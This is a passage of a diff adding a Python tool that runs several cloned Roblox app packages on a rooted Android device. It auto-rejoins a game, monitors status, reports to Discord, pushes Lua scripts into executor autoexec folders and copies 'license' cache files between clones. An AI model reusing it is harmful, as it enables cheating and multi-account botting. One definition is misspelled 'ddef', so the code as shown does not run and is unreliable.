+                # PERBAIKAN: File license langsung di folder Cache
+                "cache_dir": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Internals/Cache",
+                "license_path": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Internals/Cache"
+            }
+            saved[pkg] = package_info
+            print(f"{user} ✓")
+        else:
+            print("SKIP")
+
+    if saved:
+        with open(PACKAGES_FILE, "w") as f:
+            json.dump(saved, f, indent=2)
+        print(f"\nSaved {len(saved)} packages")
+    else:
+        print("\nNo valid packages")
+
+    input("\nEnter...")
+
+def load_packages():
+    if os.path.exists(PACKAGES_FILE):
+        try:
+            with open(PACKAGES_FILE) as f:
+                return json.load(f)
+        except Exception as e:
+            log(f"Load packages error: {e}")
+    return {}
+
+# =========================
+# APP CONTROL
+# =========================
+def is_app_running(package):
+    return bool(run_root_cmd(f"pidof {package}"))
+
+def stop_app(package):
+    run_root_cmd(f"am force-stop {package}")
+    run_root_cmd(f"pkill -9 -f {package}")
+    run_root_cmd(f"killall {package}")
+    log(f"Stopped {package}")
+
+def start_app(package, game_id):
+    cmd = (
+        f"am start -a android.intent.action.VIEW "
+        f"-d 'roblox://placeID={game_id}' "
+        f"-n {package}/com.roblox.client.ActivityProtocolLaunch"
+    )
+    run_root_cmd(cmd)
+    # RESET TIMER SAAT APP DILAUNCH
+    last_launch_time[package] = time.time()
+    log(f"Started {package} (launch timer reset)")
+
+# =========================
+# CACHE FOLDER MANAGEMENT
+# =========================
+def find_cache_dir(package_name):
+    """Cari folder Cache untuk package tertentu"""
+    possible_paths = [
+        f"/storage/emulated/0/Android/data/{package_name}/files/gloop/external/Internals/Cache",
+        f"/sdcard/Android/data/{package_name}/files/gloop/external/Internals/Cache",
+    ]
+    
+    for cache_dir in possible_paths:
+        if not os.path.isdir(cache_dir):
+            continue
+        
+        try:
+            files = os.listdir(cache_dir)
+            if files:
+                return cache_dir
+        except:
+            pass
+    
+    return None
+
+def copy_all_cache_files(source_cache_dir, dest_cache_dir, use_root=False):
+    """
+    Copy semua file dari folder Cache source ke destination
+    
+    Args:
+        source_cache_dir: Path folder Cache sumber
+        dest_cache_dir: Path folder Cache tujuan
+        use_root: Gunakan root command jika True
+    
+    Returns:
+        tuple: (success_count, failed_count, error_msg)
+    """
+    success = 0
+    failed = 0
+    error_msg = ""
+    
+    try:
+        # Pastikan source folder ada
+        if not os.path.isdir(source_cache_dir):
+            return 0, 0, f"Source folder tidak ditemukan: {source_cache_dir}"
+        
+        # Buat destination folder jika belum ada
+        if use_root:
+            run_root_cmd(f"mkdir -p '{dest_cache_dir}'")
+        else:
+            os.makedirs(dest_cache_dir, exist_ok=True)
+        
+        # List semua file di source
+        try:
+            source_files = os.listdir(source_cache_dir)
+        except PermissionError:
+            # Jika tidak bisa list dengan Python, coba dengan root
+            if use_root:
+                file_list = run_root_cmd(f"ls '{source_cache_dir}'")
+                source_files = file_list.split('\n') if file_list else []
+            else:
+                return 0, 0, "Permission denied - coba gunakan root mode"
+        
+        if not source_files:
+            return 0, 0, "Source folder kosong"
+        
+        # Copy setiap file
+        for filename in source_files:
+            if not filename.strip():
+                continue
+                
+            source_file = os.path.join(source_cache_dir, filename)
+            dest_file = os.path.join(dest_cache_dir, filename)
+            
+            try:
+                if use_root:
+                    result = run_root_cmd(f"cp '{source_file}' '{dest_file}'")
+                    if result == "":  # Empty string means success
+                        success += 1
+                    else:
+                        failed += 1
+                        error_msg += f"Failed to copy {filename}; "
+                else:
+                    shutil.copy2(source_file, dest_file)
+                    success += 1
+            except Exception as e:
+                failed += 1
+                error_msg += f"Error copying {filename}: {str(e)}; "
+        
+        return success, failed, error_msg
+    
+    except Exception as e:
+        return 0, 0, f"General error: {str(e)}"
+
+def copy_license_to_all_packages():
+    """Menu untuk copy license ke semua package"""
+    clear_screen()
+    print("=" * 70)
+    print("🗂️ COPY CACHE FILES TO ALL PACKAGES")
+    print("=" * 70)
+    
+    pkgs = load_packages()
+    if not pkgs:
+        log("No packages found")
+        input("\nPress ENTER...")
+        return
+    
+    # Cari source package yang punya cache
+    source_pkg = None
+    source_cache_dir = None
+    
+    print("\n📋 Available packages with cache:")
+    available = []
+    for i, (pkg, info) in enumerate(pkgs.items(), 1):
+        cache_dir = find_cache_dir(pkg)
+        if cache_dir:
+            available.append((pkg, info, cache_dir))
+            print(f"  {i}. {info['username']} (Package: {pkg})")
+    
+    if not available:
+        log("❌ No packages with cache files found!")
+        input("\nPress ENTER...")
+        return
+    
+    # Pilih source
+    choice = input(f"\n📌 Select source package (1-{len(available)}) or Enter for first: ").strip()
+    
+    if choice == "":
+        source_pkg, source_info, source_cache_dir = available[0]
+    else:
+        try:
+            idx = int(choice) - 1
+            if 0 <= idx < len(available):
+                source_pkg, source_info, source_cache_dir = available[idx]
+            else:
+                log("Invalid choice")
+                input("\nPress ENTER...")
+                return
+        except ValueError:
+            log("Invalid input")
+            input("\nPress ENTER...")
+            return
+    
+    log(f"\n✅ Source: {source_info['username']} ({source_pkg})")
+    log(f"📂 Source cache: {source_cache_dir}")
+    
+    # Tampilkan file yang akan di-copy
+    try:
+        files = os.listdir(source_cache_dir)
+        log(f"📄 Files to copy: {len(files)}")
+        for f in files[:5]:  # Show first 5
+            log(f"  - {f}")
+        if len(files) > 5:
+            log(f"  ... and {len(files) - 5} more files")
+    except Exception as e:
+        log(f"Error listing files: {e}")
+    
+    confirm = input("\n⚠️ Copy to ALL other packages? (y/n): ").strip().lower()
+    if confirm != 'y':
+        log("Cancelled")
+        input("\nPress ENTER...")
+        return
+    
+    # Tanya mode
+    mode = input("Use root mode? (y/n, default=n): ").strip().lower()
+    use_root = (mode == 'y')
+    
+    print("\n" + "=" * 70)
+    log("Starting copy process...")
+    print("=" * 70)
+    
+    total_success = 0
+    total_failed = 0
+    
+    for pkg, info in pkgs.items():
+        if pkg == source_pkg:
+            continue
+        
+        username = info['username']
+        dest_cache_dir = find_cache_dir(pkg)
+        
+        if not dest_cache_dir:
+            # Coba buat folder
+            dest_cache_dir = f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Internals/Cache"
+            if use_root:
+                run_root_cmd(f"mkdir -p '{dest_cache_dir}'")
+            else:
+                try:
+                    os.makedirs(dest_cache_dir, exist_ok=True)
+                except:
+                    pass
+        
+        log(f"\n📦 Copying to: {username}")
+        success, failed, error = copy_all_cache_files(source_cache_dir, dest_cache_dir, use_root)
+        
+        if success > 0:
+            log(f"  ✅ Success: {success} files")
+            total_success += success
+        if failed > 0:
+            log(f"  ❌ Failed: {failed} files")
+            total_failed += failed
+        if error:
+            log(f"  ⚠️ Errors: {error[:100]}")
+    
+    print("\n" + "=" * 70)
+    log(f"📊 RESULTS:")
+    log(f"  ✅ Total success: {total_success} files")
+    log(f"  ❌ Total failed: {total_failed} files")
+    print("=" * 70)
+    
+    input("\nPress ENTER...")
+
+def view_license_status():
+    """Lihat status cache untuk semua package"""
+    clear_screen()
+    print("=" * 70)
+    print("📊 CACHE FOLDER STATUS")
+    print("=" * 70)
+    
+    pkgs = load_packages()
+    if not pkgs:
+        log("No packages found")
+        input("\nPress ENTER...")
+        return
+    
+    print(f"\n{'No.':<4} {'Username':<20} {'Cache Status':<15} {'File Count':<12}")
+    print("-" * 70)
+    
+    for i, (pkg, info) in enumerate(pkgs.items(), 1):
+        username = info['username']
+        cache_dir = find_cache_dir(pkg)
+        
+        if cache_dir:
+            try:
+                files = os.listdir(cache_dir)
+                file_count = len(files)
+                status = "✅ Found"
+                count_str = str(file_count)
+            except:
+                status = "⚠️ Error"
+                count_str = "N/A"
+        else:
+            status = "❌ Not Found"
+            count_str = "0"
+        
+        print(f"{i:<4} {username:<20} {status:<15} {count_str:<12}")
+    
+    print("=" * 70)
+    input("\nPress ENTER...")
+
+# =========================
+# SCRIPT MANAGEMENT
+# =========================
+def list_executor_scripts(package_info):
+    """Mendapatkan daftar script untuk paket tertentu"""
+    autoexec_dir = package_info.get("autoexec_dir", "")
+    
+    if not autoexec_dir or not os.path.exists(autoexec_dir):
+        return []
+    
+    try:
+        return [
+            f for f in os.listdir(autoexec_dir)
+            if f.endswith((".lua", ".txt"))
+        ]
+    except:
+        return []
+
+def add_script_to_all_packages():
+    """Menambahkan script ke semua paket"""
+    clear_screen()
+    print("=" * 70)
+    print("📝 ADD SCRIPT TO ALL PACKAGES")
+    print("=" * 70)
+    
+    pkgs = load_packages()
+    if not pkgs:
+        log("No packages found")
+        input("\nPress ENTER...")
+        return
+    
+    print(f"\nFound {len(pkgs)} packages:")
+    for i, (pkg, info) in enumerate(pkgs.items(), 1):
+        print(f"  {i}. {info['username']}")
+    
+    print("\n" + "-" * 70)
+    print("Paste script content (press ENTER twice to finish):")
+    
+    lines = []
+    empty_count = 0
+    
+    while True:
+        try:
+            line = input()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            break
+        
+        if line == "":
+            empty_count += 1
+            if empty_count >= 2:
+                break
+        else:
+            empty_count = 0
+            lines.append(line)
+    
+    script_content = "\n".join(lines).strip()
+    
+    if not script_content:
+        log("Empty script, cancelled")
+        input("\nPress ENTER...")
+        return
+    
+    script_name = input("\n📌 Script name (without .lua): ").strip()
+    if not script_name:
+        log("Invalid script name")
+        input("\nPress ENTER...")
+        return
+    
+    if not script_name.endswith(".lua"):
+        script_name += ".lua"
+    
+    print("\n" + "=" * 70)
+    log("Adding script to all packages...")
+    print("=" * 70)
+    
+    success_count = 0
+    failed_count = 0
+    
+    for pkg, info in pkgs.items():
+        autoexec_dir = info.get("autoexec_dir", "")
+        
+        if not autoexec_dir:
+            log(f"❌ {info['username']}: No autoexec dir")
+            failed_count += 1
+            continue
+        
+        # Buat folder jika belum ada
+        if not os.path.exists(autoexec_dir):
+            try:
+                os.makedirs(autoexec_dir, exist_ok=True)
+            except Exception as e:
+                log(f"❌ {info['username']}: Can't create dir - {e}")
+                failed_count += 1
+                continue
+        
+        # Tulis script
+        script_path = os.path.join(autoexec_dir, script_name)
+        try:
+            with open(script_path, 'w') as f:
+                f.write(script_content)
+            log(f"✅ {info['username']}")
+            success_count += 1
+        except Exception as e:
+            log(f"❌ {info['username']}: {e}")
+            failed_count += 1
+    
+    print("\n" + "=" * 70)
+    log(f"📊 RESULTS: {success_count} success, {failed_count} failed")
+    print("=" * 70)
+    input("\nPress ENTER...")
+
+def delete_script_from_all_packages():
+    """Hapus script dari semua package"""
+    clear_screen()
+    print("=" * 70)
+    print("🗑️ DELETE SCRIPT FROM ALL PACKAGES")
+    print("=" * 70)
+    
+    pkgs = load_packages()
+    if not pkgs:
+        log("No packages found")
+        input("\nPress ENTER...")
+        return
+    
+    # Tampilkan script yang ada
+    print("\n📋 Available scripts:")
+    all_scripts = set()
+    
+    for pkg, info in pkgs.items():
+        scripts = list_executor_scripts(info)
+        all_scripts.update(scripts)
+    
+    if not all_scripts:
+        log("No scripts found in any package")
+        input("\nPress ENTER...")
+        return
+    
+    for i, script in enumerate(sorted(all_scripts), 1):
+        print(f"  {i}. {script}")
+    
+    # Pilih script
+    script_name = input("\n📌 Script name to delete: ").strip()
+    if not script_name:
+        log("Cancelled")
+        input("\nPress ENTER...")
+        return
+    
+    confirm = input(f"\n⚠️ Delete '{script_name}' from ALL packages? (y/n): ").strip().lower()
+    if confirm != 'y':
+        log("Cancelled")
+        input("\nPress ENTER...")
+        return
+    
+    # Hapus dari semua package
+    success_count = 0
+    not_found_count = 0
+    
+    for pkg, info in pkgs.items():
+        autoexec_dir = info.get("autoexec_dir", "")
+        if not autoexec_dir:
+            continue
+        
+        script_path = os.path.join(autoexec_dir, script_name)
+        
+        if os.path.exists(script_path):
+            try:
+                os.remove(script_path)
+                log(f"✅ {info['username']}")
+                success_count += 1
+            except Exception as e:
+                log(f"❌ {info['username']}: {e}")
+        else:
+            not_found_count += 1
+    
+    print("\n" + "=" * 70)
+    log(f"📊 RESULTS: {success_count} deleted, {not_found_count} not found")
+    print("=" * 70)
+    input("\nPress ENTER...")
+
+def view_scripts_all_packages():
+    """Lihat semua script di semua package"""
+    clear_screen()
+    print("=" * 70)
+    print("👁️ VIEW SCRIPTS IN ALL PACKAGES")
+    print("=" * 70)
+    
+    pkgs = load_packages()
+    if not pkgs:
+        log("No packages found")
+        input("\nPress ENTER...")
+        return
+    
+    for i, (pkg, info) in enumerate(pkgs.items(), 1):
+        username = info['username']
+        scripts = list_executor_scripts(info)
+        
+        print(f"\n{i}. {username}")
+        if scripts:
+            for script in scripts:
+                print(f"   📜 {script}")
+        else:
+            print("   (No scripts)")
+    
+    print("\n" + "=" * 70)
+    input("Press ENTER...")
+
+# =========================
+# WORKSPACE MONITORING - PERBAIKAN DI SINI
+# =========================
+def get_workspace_json_path(package_info, username, cfg):
+    """Mendapatkan path workspace JSON untuk paket tertentu - DIPERBAIKI"""
+    workspace_dir = package_info.get("workspace_dir", 
+                     f"/storage/emulated/0/Android/data/com.roblox.client/files/gloop/external/Workspace")
+    
+    # Buat direktori jika belum ada
+    os.makedirs(workspace_dir, exist_ok=True)
+    
+    return f"{workspace_dir}/{username}{cfg['json_suffix']}"
+
+def get_json_timestamp(package_info, username, cfg):
+    """Baca timestamp dari JSON file workspace - DIPERBAIKI DENGAN MULTI-FIELD SUPPORT"""
+    json_path = get_workspace_json_path(package_info, username, cfg)
+    
+    # Cek apakah file ada
+    if not os.path.exists(json_path):
+        return None
+    
+    try:
+        # Baca timestamp dari file
+        with open(json_path, 'r') as f:
+            data = json.load(f)
+        
+        # Cari field timestamp - coba berbagai kemungkinan nama field
+        timestamp_field = None
+        for field in ["timestamp", "time", "last_update", "updated_at"]:
+            if field in data:
+                timestamp_field = data[field]
+                break
+        
+        if timestamp_field:
+            return timestamp_field
+        else:
+            # Gunakan waktu modifikasi file sebagai fallback
+            return os.path.getmtime(json_path)
+    except Exception as e:
+        log(f"Error reading JSON for {username}: {e}")
+        return None
+
+def parse_timestamp(timestamp):
+    """Parse timestamp dari berbagai format - DIPERBAIKI"""
+    try:
+        if isinstance(timestamp, (int, float)):
+            return timestamp
+        
+        # Coba format ISO (2026-02-04T18:08:15Z)
+        if "T" in timestamp and "Z" in timestamp:
+            dt_str = timestamp.replace("Z", "+00:00")
+            dt = datetime.fromisoformat(dt_str)
+            return dt.timestamp()
+        
+        # Coba format dengan timezone
+        if "T" in timestamp and ("+" in timestamp or timestamp.count("-") == 2):
+            dt = datetime.fromisoformat(timestamp)
+            return dt.timestamp()
+        
+        # Coba format standar
+        try:
+            dt = datetime.strptime(timestamp, "%Y-%m-%d %H:%M:%S")
+            return dt.timestamp()
+        except ValueError:
+            pass
+        
+        # Coba format lain
+        for fmt in ["%Y-%m-%dT%H:%M:%S", "%Y/%m/%d %H:%M:%S", "%d-%m-%Y %H:%M:%S"]:
+            try:
+                dt = datetime.strptime(timestamp, fmt)
+                return dt.timestamp()
+            except ValueError:
+                continue
+        
+        return None
+        
+    except Exception as e:
+        return None
+
+ddef check_workspace_status(package, package_info, cfg):
+    username = package_info["username"]
+    now = time.time()
+
+    launch_time = last_launch_time.get(package)
+    cooldown_time = launch_cooldown.get(package, 0)
+    ever_online = package_info.get("ever_online", False)
+
+    if not is_app_running(package):
+        # BARU SAJA LAUNCH → MASIH LOADING
+        if launch_time and (now - launch_time) < cfg["launch_grace"]:
+            return "waiting"
+
+        # BENAR-BENAR MATI
+        last_launch_time.pop(package, None)
+        return "offline"
+
+    timestamp = get_json_timestamp(package_info, username, cfg)
+
+    # JSON BELUM ADA
+    if not timestamp:
+        if launch_time and (now - launch_time) <= cfg["launch_wait_timeout"]:
+            return "waiting"
+        return "waiting_timeout"
+
+    json_time = parse_timestamp(timestamp)
+    if not json_time:
+        return "waiting"
+
+    # CEK: JSON harus update SETELAH launch!
+    if launch_time and json_time < launch_time:
+        # JSON masih dari session lama
+        if (now - launch_time) <= cfg["launch_wait_timeout"]:
+            return "waiting"
+        return "waiting_timeout"
+
+    # JSON UPDATE → ONLINE
+    if not ever_online:
+        package_info["ever_online"] = True
+        return "online"
+
+    # SUDAH PERNAH ONLINE, TAPI JSON STOP
+    if (now - json_time) > cfg["online_timeout"]:  # 120
+        return "offline"
+
+    return "online"
+
+
+def wait_for_workspace(package, package_info, cfg, max_wait=None):
+    """Tunggu sampai workspace online - DIPERBAIKI"""
+    if max_wait is None:
+        max_wait = cfg["workspace_timeout"]
+    
+    username = package_info["username"]
+    log(f"Waiting for workspace: {username}")
+    
+    start = time.time()
+    last_status = None
+    
+    while (time.time() - start) < max_wait:
+        status = check_workspace_status(package, package_info, cfg)
+        
+        if status != last_status:
+            log(f"Status {username}: {status}")
+            last_status = status
+        
+        if status == "online":
+            log(f"{username} is online!")
+            return True
+        
+        time.sleep(cfg["workspace_check_interval"])
+    
+    log(f"{username} timeout")
+    return False
+
+# =========================
+# SEQUENTIAL STARTUP
+# =========================
+def sequential_startup(pkgs, cfg):
+    """Start semua package satu per satu dan tunggu online"""
+    success_count = 0
+    
+    # TAMBAHAN: Stop semua package dulu sebelum mulai startup
+    log("=" * 60)
+    log("STOPPING ALL EXISTING INSTANCES")
+    log("=" * 60)
+    for pkg, info in pkgs.items():
+        if is_app_running(pkg):
+            log(f"Stopping existing instance: {info['username']}")
+            stop_app(pkg)
+        last_launch_time.pop(pkg, None)
+
+    # Tunggu sebentar setelah stop semua
+    log("Waiting after stopping all...")
+    time.sleep(cfg["restart_delay"] * 2)
+    
+    # Mulai startup satu per satu
+    for i, (pkg, info) in enumerate(pkgs.items(), 1):
+        username = info["username"]
+        print(f"\n{'='*60}")
+        print(f"Starting {i}/{len(pkgs)}: {username}")
+        print(f"{'='*60}")
+   
+        # Mulai aplikasi
+        log("Stopping existing instance")
+        stop_app(pkg)
+        log("Starting application")
+        last_launch_time.pop(pkg, None)
+        start_app(pkg, cfg["game_id"])
+        # ✅ HAPUS sleep(startup_delay) - langsung wait!
+        
+        # Tunggu sampai online
+        if wait_for_workspace(pkg, info, cfg):
+            success_count += 1
+            print(f"✅ {username} is ONLINE")
+            
+            if i < len(pkgs):
+                print(f"⏳ Waiting 3 seconds before next account...")
+                time.sleep(3)  # Jeda antar akun
+        else:
+            print(f"❌ {username} FAILED to go online")
+            
+            # Retry
+            print(f"🔄 Retrying {username}...")
+            stop_app(pkg)
+            time.sleep(cfg["restart_delay"])
+            last_launch_time.pop(pkg, None)
+            start_app(pkg, cfg["game_id"])
+            # ✅ HAPUS sleep(startup_delay) - langsung wait!
+            
+            if wait_for_workspace(pkg, info, cfg, max_wait=90):
+                success_count += 1
+                print(f"✅ {username} is ONLINE (after retry)")
+            else:
+                print(f"❌ {username} STILL FAILED")
+    
+    # Setelah semua selesai startup
+    log("=" * 60)
+    log(f"STARTUP COMPLETE: {success_count}/{len(pkgs)} online")
+    log("=" * 60)
+    return success_count
+
+def restart_all_roblox(pkgs, cfg):
+    """Restart semua Roblox package"""
+    log("=" * 60)
+    log("RESTARTING ALL ROBLOX PACKAGES")
+    log("=" * 60)
+    
+    # Stop semua
+    for pkg, info in pkgs.items():
+        if is_app_running(pkg):
+            log(f"Stopping {info['username']}")
+            stop_app(pkg)
+    
+    log("Waiting before restart...")
+    time.sleep(cfg["restart_delay"] * 2)
+    
+    # Start semua sequential
+    return sequential_startup(pkgs, cfg)
+
+# =========================
+# MONITOR WITH TABLE
+# =========================
+def display_status_table(pkgs, cfg):
+    """Display status table dengan Rich library untuk tampilan lebih rapi"""
+    clear_screen()
+    
+    console = Console()
+    
+    # Buat tabel dengan Rich
+    table = Table(
+        title="🎮 ROBLOX OVA Rejoin",
+        title_style="bold cyan",
+        show_header=True,
+        header_style="bold magenta",
+        border_style="bright_blue",
+        expand=False,
+        padding=(0, 1)
+    )
+    
+    # Tambah kolom
+    table.add_column("No", style="cyan", width=4, justify="center")
+    table.add_column("Username", style="green", width=20)
+    table.add_column("Package", style="yellow", width=35)
+    table.add_column("Status", style="white", width=12, justify="center")
+    
+    all_online = True
+    
+    # Tambah data rows
+    for i, (pkg, info) in enumerate(pkgs.items(), 1):
+        username = info["username"]
+        status = check_workspace_status(pkg, info, cfg)
+        
+        pkg_display = pkg if len(pkg) <= 35 else pkg[:32] + "..."
+        
+        if status == "online":
+            status_display = "[green]✅ ONLINE[/green]"
+        elif status == "waiting":
+            status_display = "[yellow]⏳ WAITING[/yellow]"
+            all_online = False
+        else:
+            status_display = "[red]❌ OFFLINE[/red]"
+            all_online = False
+        
+        table.add_row(
+            str(i),
+            username,
+            pkg_display,
+            status_display
+        )
+    
+    # Print tabel
+    console.print(table)
+    
+    # Footer info
+    footer_text = (
+        f"🕒 {time.strftime('%H:%M:%S')}  |  "
+        f"📦 Packages: {len(pkgs)}  |  "
+        f"🌐 All Online: {'[green]YES ✅[/green]' if all_online else '[red]NO ❌[/red]'}"
+    )
+    console.print(Panel(footer_text, style="bold", border_style="bright_blue"))
+    
+    return all_online
+
+def monitor():
+    global monitor_active
+    
+    cfg = load_config()
+    pkgs = load_packages()
+    
+    if not cfg["game_id"]:
+        log("Game ID not set")
+        input("Enter...")
+        return
+    
+    if not pkgs:
+        log("No packages found")
+        input("Enter...")
+        return
+    
+    monitor_active = True
+    
+    # Sequential startup
+    print("=" * 60)
+    print("STARTING SEQUENTIAL STARTUP")
+    print("=" * 60)
+    time.sleep(2)
+    
+    online_count = sequential_startup(pkgs, cfg)
+    
+    if online_count == 0:
+        log("No accounts went online")
+        input("Enter...")
+        return
+    
+    log(f"\n{online_count} accounts online, starting monitor...")
+    time.sleep(3)
+    
+    # Send startup webhook
+    if cfg.get("webhook_enabled", False) and cfg.get("webhook_url", ""):
+        message = build_webhook_status_message(pkgs, cfg)
+        send_discord_webhook(
+            cfg["webhook_url"],
+            "🚀 Monitor Started",
+            message,
+            3066993  # Green
+        )
+    
+    try:
+        cycle_count = 0
+        last_webhook_time = time.time()
+        last_restart_time = time.time()
+        
+        while monitor_active:
+            cycle_count += 1
+            
+            # Tampilkan tabel
+            all_online = display_status_table(pkgs, cfg)
+            
+            if cycle_count == 1 or cycle_count % 5 == 0:
+                log(f"Monitoring cycle #{cycle_count}")
+            
+            # Periksa dan perbaiki status
+            needs_fix = False
+            for pkg, info in pkgs.items():
+                status = check_workspace_status(pkg, info, cfg)
+                if status == "waiting_timeout":
+                    log(f"{info['username']} waiting timeout, restarting...")
+                    stop_app(pkg)
+                    time.sleep(cfg["restart_delay"])
+                    start_app(pkg, cfg["game_id"])  # ✅ TAMBAH INI
+
+                elif status == "offline":
+                    log(f"{info['username']} is OFFLINE, restarting...")
+                    stop_app(pkg)
+                    time.sleep(cfg["restart_delay"]) 
+                    start_app(pkg, cfg["game_id"])
+
+                elif status == "waiting":
+                    # NORMAL — jangan diganggu
+                    pass
+
+                elif status == "online":
+                    pass
+                   
+            # Cek webhook interval
+            current_time = time.time()
+            webhook_interval_seconds = cfg.get("webhook_interval", 10) * 60
+            
+            if cfg.get("webhook_enabled", False) and cfg.get("webhook_url", ""):
+                if (current_time - last_webhook_time) >= webhook_interval_seconds:
+                    message = build_webhook_status_message(pkgs, cfg)
+                    send_discord_webhook(
+                        cfg["webhook_url"],
+                        "📊 Status Update",
+                        message,
+                        3447003  # Blue
+                    )
+                    last_webhook_time = current_time
+                    log("📡 Webhook sent")
+            
+            # Cek restart interval
+            restart_interval_seconds = cfg.get("restart_interval", 0) * 60
+            if restart_interval_seconds > 0:
+                if (current_time - last_restart_time) >= restart_interval_seconds:
+                    log("⏰ Auto restart time reached")
+                    
+                    # Send webhook before restart
+                    if cfg.get("webhook_enabled", False) and cfg.get("webhook_url", ""):
+                        send_discord_webhook(
+                            cfg["webhook_url"],
+                            "🔄 Auto Restart",
+                            "Restarting all Roblox packages...",
+                            16776960  # Yellow
+                        )
+                    
+                    restart_all_roblox(pkgs, cfg)
+                    last_restart_time = current_time
+                    
+                    # Wait for all to come online
+                    log("Waiting for restart...")
+                    time.sleep(cfg["startup_delay"] * 2)
+            
+            time.sleep(cfg["check_interval"])
+    
+    except Exception as e:
+        log(f"Monitor error: {e}")
+        
+        # Send error webhook
+        if cfg.get("webhook_enabled", False) and cfg.get("webhook_url", ""):
+            send_discord_webhook(
+                cfg["webhook_url"],
+                "❌ Monitor Error",
+                f"Error occurred: {str(e)}",
+                16711680  # Red
+            )
+        
+        input("Press ENTER...")
+    finally:
+        monitor_active = False
+
+# =========================
+# MENU
+# =========================
+def menu():
+    while True:
+        clear_screen()
+        cfg = load_config()
+        pkgs = load_packages()
+        
+        print("=" * 70)
+        print("🤖 ROBLOX MULTI-PACKAGE MANAGER (Termux/Cloudphone)")
+        print("=" * 70)
+        print(f"🎮 Game ID : {cfg.get('game_id', 'Not set')}")
+        print(f"📦 Packages: {len(pkgs)}")
+        
+        # Webhook info
+        webhook_status = "✅" if cfg.get("webhook_enabled", False) else "❌"
+        print(f"📡 Webhook : {webhook_status}")
+        if cfg.get("webhook_url", ""):
+            webhook_display = cfg["webhook_url"][:40] + "..." if len(cfg["webhook_url"]) > 40 else cfg["webhook_url"]
+            print(f"   URL     : {webhook_display}")
+            print(f"   Interval: {cfg.get('webhook_interval', 10)} minutes")
+            restart_text = f"{cfg.get('restart_interval', 0)} minutes" if cfg.get('restart_interval', 0) > 0 else "Disabled"
+            print(f"   Restart : {restart_text}")
+        
+        if pkgs:
+            print("\n📋 Registered Packages:")
+            for i, (pkg, info) in enumerate(pkgs.items(), 1):
+                cache_dir = find_cache_dir(pkg)
+                cache_status = "✅" if cache_dir else "❌"
+                scripts_count = len(list_executor_scripts(info))
+                print(f"  {i}. {info['username']} (🗂️:{cache_status} 📜:{scripts_count})")
+        
+        print("=" * 70)
+        print("1. 🚀 Start Monitor (All Packages)")
+        print("2. ⚙️ Set Game ID")
+        print("3. 🔍 Auto Detect Packages")
+        print("4. 📡 Configure Webhook")
+        print("-" * 40)
+        print("5. 📝 Add Script to ALL Packages")
+        print("6. 🗑️ Delete Script from ALL Packages")
+        print("7. 👁️ View Scripts in ALL Packages")
+        print("-" * 40)
+        print("8. 🗂️ Copy ALL Cache Files to ALL Packages")
+        print("9. 📊 View Cache Folder Status")
+        print("-" * 40)
+        print("T. 🧪 Test Workspace Detection")
+        print("W. 📡 Test Webhook")
+        print("C. 🖥️ Test CPU/RAM Detection")
+        print("0. ❌ Exit\n")
+        
+        c = input("📌 Select: ").strip()
+        
+        if c == "1": 
+            monitor()
+        elif c == "2":
+            cfg["game_id"] = input("🎮 Game ID: ").strip()
+            save_config(cfg)
+            input("Enter...")
+        elif c == "3": 
+            auto_detect_and_save_packages()
+        elif c == "4":
+            # Configure webhook
+            clear_screen()
+            print("=" * 70)
+            print("📡 WEBHOOK CONFIGURATION")
+            print("=" * 70)
+            
+            webhook_url = input("🔗 Discord webhook URL (Enter to skip): ").strip()
+            if webhook_url:
+                cfg["webhook_url"] = webhook_url
+            
+            enable = input("📡 Enable webhook? (y/n, default=y): ").strip().lower()
+            cfg["webhook_enabled"] = (enable == "" or enable == "y")
+            
+            interval = input("⏱️ Webhook interval in minutes (default=10): ").strip()
+            if interval:
+                try:
+                    cfg["webhook_interval"] = int(interval)
+                except:
+                    cfg["webhook_interval"] = 10
+            
+            restart = input("🔄 Restart interval in minutes (0=disabled, default=0): ").strip()
+            if restart:
+                try:
+                    cfg["restart_interval"] = int(restart)
+                except:
+                    cfg["restart_interval"] = 0
+            
+            save_config(cfg)
+            log("✅ Webhook configuration saved")
+            input("\nPress ENTER...")
+        elif c == "5": 
+            add_script_to_all_packages()
+        elif c == "6": 
+            delete_script_from_all_packages()
+        elif c == "7": 
+            view_scripts_all_packages()
+        elif c == "8": 
+            copy_license_to_all_packages()
+        elif c == "9": 
+            view_license_status()
+        elif c.lower() == "t":
+            # Test workspace
+            if pkgs:
+                clear_screen()
+                print("🧪 Testing workspace detection...")
+                for pkg, info in pkgs.items():
+                    timestamp = get_json_timestamp(info, info["username"], cfg)
+                    print(f"{info['username']}: {timestamp}")
+                input("\nPress ENTER...")
+        elif c.lower() == "w":
+            # Test webhook - IMPROVED
+            clear_screen()
+            print("=" * 70)
+            print("📡 TEST WEBHOOK")
+            print("=" * 70)
+            
+            if not cfg.get("webhook_url", ""):
+                log("❌ Webhook URL not configured!")
+                input("\nPress ENTER...")
+            else:
+                log(f"Testing webhook: {cfg['webhook_url'][:50]}...")
+                
+                # Get real-time stats untuk test
+                cpu_percent = get_cpu_usage()
+                cpu_cores = get_cpu_count()
+                ram_info = get_ram_info()
+                
+                test_message = "**🧪 Test Message**\n"
+                test_message += f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                test_message += "**📊 System Info**\n"
+                
+                if cpu_percent != "N/A":
+                    test_message += f"CPU: {cpu_percent}% ({cpu_cores} cores)\n"
+                else:
+                    test_message += f"CPU: N/A ({cpu_cores} cores)\n"
+                
+                if ram_info:
+                    ram_total_gb = ram_info['total_mb'] / 1024
+                    ram_used_gb = ram_info['used_mb'] / 1024
+                    test_message += f"RAM: {ram_info['percent']}% ({ram_used_gb:.2f} GB / {ram_total_gb:.2f} GB)"
+                else:
+                    test_message += "RAM: N/A"
+                
+                result = send_discord_webhook(
+                    cfg["webhook_url"],
+                    "🧪 Webhook Test",
+                    test_message,
+                    3447003  # Blue
+                )
+                
+                if result:
+                    log("✅ Webhook sent successfully!")
+                else:
+                    log("❌ Webhook failed to send!")
+                
+                input("\nPress ENTER...")
+        elif c.lower() == "c":
+            # Test CPU/RAM detection - IMPROVED
+            clear_screen()
+            print("=" * 70)
+            print("🖥️ TEST CPU & RAM DETECTION")
+            print("=" * 70)
+            
+            log("Testing CPU & RAM detection methods...")
+            log("Collecting data (please wait)...\n")
+            
+            cpu_percent = get_cpu_usage()
+            cpu_cores = get_cpu_count()
+            ram_info = get_ram_info()
+            
+            print(f"📊 SYSTEM INFORMATION:")
